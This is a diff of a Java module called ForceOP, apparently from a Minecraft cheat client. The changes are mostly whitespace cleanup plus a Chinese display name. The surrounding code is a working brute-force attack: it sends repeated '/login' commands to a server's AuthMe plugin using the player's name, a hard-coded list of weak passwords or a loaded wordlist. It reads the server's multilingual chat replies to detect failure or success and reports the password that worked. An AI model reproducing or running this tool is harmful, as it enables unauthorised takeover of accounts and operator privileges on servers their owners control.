@@ -39,41 +39,41 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		"creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz",
 		"ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"};
 	private String[] passwords;
-	
+
 	private boolean gotWrongPwMsg;
 	private int lastPW;
-	
+
 	private Process process;
-	
+
 	public ForceOpHack()
 	{
-		super("ForceOP");
+		super("ForceOP", "破解OP");
 		setCategory(Category.CHAT);
 	}
-	
+
 	@Override
 	public void onEnable()
 	{
 		passwords = defaultList;
 		gotWrongPwMsg = false;
 		lastPW = -1;
-		
+
 		try
 		{
 			process = MultiProcessingUtils.startProcessWithIO(
 				ForceOpDialog.class, MC.getSession().getUsername());
-			
+
 			new Thread(this::handleDialogOutput, "ForceOP dialog output")
 				.start();
-			
+
 		}catch(IOException e)
 		{
 			throw new RuntimeException(e);
 		}
-		
+
 		EVENTS.add(ChatInputListener.class, this);
 	}
-	
+
 	private void handleDialogOutput()
 	{
 		try(BufferedReader bf =
@@ -82,15 +82,15 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		{
 			for(String line = ""; (line = bf.readLine()) != null;)
 				messageFromDialog(line);
-			
+
 			setEnabled(false);
-			
+
 		}catch(IOException e)
 		{
 			e.printStackTrace();
 		}
 	}
-	
+
 	private void messageFromDialog(String msg)
 	{
 		if(msg.startsWith("start "))
@@ -101,14 +101,14 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 			new Thread(() -> runForceOP(delay, waitForMsg), "ForceOP").start();
 			return;
 		}
-		
+
 		if(msg.startsWith("list "))
 		{
 			loadPwList(msg.substring(5));
 			sendNumPwToDialog();
 		}
 	}
-	
+
 	private void loadPwList(String list)
 	{
 		if("default".equals(list))
@@ -116,20 +116,20 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 			passwords = defaultList;
 			return;
 		}
-		
+
 		try
 		{
 			List<String> loadedPWs =
 				Files.readAllLines(Paths.get(list), StandardCharsets.UTF_8);
 			passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
-			
+
 		}catch(IOException e)
 		{
 			e.printStackTrace();
 			passwords = defaultList;
 		}
 	}
-	
+
 	private void sendNumPwToDialog()
 	{
 		String numPW = "numPW " + (passwords.length + 1);
@@ -137,7 +137,7 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		pw.println(numPW);
 		pw.flush();
 	}
-	
+
 	private void sendIndexToDialog()
 	{
 		String index = "index " + lastPW;
@@ -145,24 +145,24 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		pw.println(index);
 		pw.flush();
 	}
-	
+
 	@Override
 	public void onDisable()
 	{
 		EVENTS.remove(ChatInputListener.class, this);
-		
+
 		if(process != null)
 			try
 			{
 				process.destroyForcibly();
 				process.waitFor();
-				
+
 			}catch(InterruptedException e)
 			{
 				throw new RuntimeException(e);
 			}
 	}
-	
+
 	private void runForceOP(int delay, boolean waitForMsg)
 	{
 		// abort if disconnected before pressing start
@@ -171,34 +171,34 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 			setEnabled(false);
 			return;
 		}
-		
+
 		MC.getNetworkHandler()
 			.sendChatCommand("login " + MC.getSession().getUsername());
 		lastPW = 0;
 		sendIndexToDialog();
-		
+
 		for(int i = 0; i < passwords.length; i++)
 		{
 			if(!isEnabled())
 				return;
-			
+
 			if(waitForMsg)
 				gotWrongPwMsg = false;
-			
+
 			while(waitForMsg && !gotWrongPwMsg || MC.player == null)
 			{
 				if(!isEnabled())
 					return;
-				
+
 				sleep(50);
-				
+
 				// If player gets kicked, don't wait for "Wrong password!".
 				if(MC.player == null)
 					gotWrongPwMsg = true;
 			}
-			
+
 			sleep(delay);
-			
+
 			boolean sent = false;
 			while(!sent)
 				try
@@ -206,100 +206,100 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 					MC.getNetworkHandler()
 						.sendChatCommand("login " + passwords[i]);
 					sent = true;
-					
+
 				}catch(Exception e)
 				{
 					sleep(50);
 				}
-			
+
 			lastPW = i + 1;
 			sendIndexToDialog();
 		}
-		
+
 		ChatUtils.message("\u00a7c[\u00a74\u00a7lFAILURE\u00a7c]\u00a7f All "
 			+ (lastPW + 1) + " passwords were wrong.");
 	}
-	
+
 	private void sleep(long millis)
 	{
 		try
 		{
 			Thread.sleep(millis);
-			
+
 		}catch(InterruptedException e)
 		{
 			throw new RuntimeException(e);
 		}
 	}
-	
+
 	@Override
 	public void onReceivedMessage(ChatInputEvent event)
 	{
 		String message = event.getComponent().getString();
 		if(message.startsWith("\u00a7c[\u00a76Wurst\u00a7c]\u00a7f "))
 			return;
-		
+
 		String msgLowerCase = message.toLowerCase();
-		
+
 		String[] wordsForWrong = {"wrong", "incorrect", // English
 			"falsch", // Deutsch!
 			"mauvais", // French
 			"mal", // Spanish
 			"sbagliato"// Italian
 		};
-		
+
 		if(containsAny(msgLowerCase, wordsForWrong))
 		{
 			gotWrongPwMsg = true;
 			return;
 		}
-		
+
 		String[] wordsForSuccess = {"success", // English & Italian
 			"erfolg", // Deutsch!
 			"succ\u00e8s", // French
 			"\u00e9xito" // Spanish
 		};
-		
+
 		if(containsAny(msgLowerCase, wordsForSuccess))
 		{
 			if(lastPW == -1)
 				return;
-			
+
 			String password;
 			if(lastPW == 0)
 				password = MC.getSession().getUsername();
 			else
 				password = passwords[lastPW - 1];
-			
+
 			ChatUtils.message(
 				"\u00a7a[\u00a72\u00a7lSUCCESS\u00a7a]\u00a7f The password \""
 					+ password + "\" worked.");
-			
+
 			setEnabled(false);
 			return;
 		}
-		
+
 		if(containsAny(msgLowerCase, "/help", "permission"))
 		{
 			ChatUtils.warning("It looks like this server doesn't have AuthMe.");
 			return;
 		}
-		
+
 		String[] wordsForLoggedIn = {"logged in", // English
 			"eingeloggt", // Deutsch!
 			"eingelogt" // falsches Deutsch!
 		};
-		
+
 		if(containsAny(msgLowerCase, wordsForLoggedIn))
 			ChatUtils.warning("It looks like you are already logged in.");
 	}
-	
+
 	private boolean containsAny(String msg, String... words)
 	{
 		for(String word : words)
 			if(msg.contains(word))
 				return true;
-			
+
 		return false;
 	}
 }
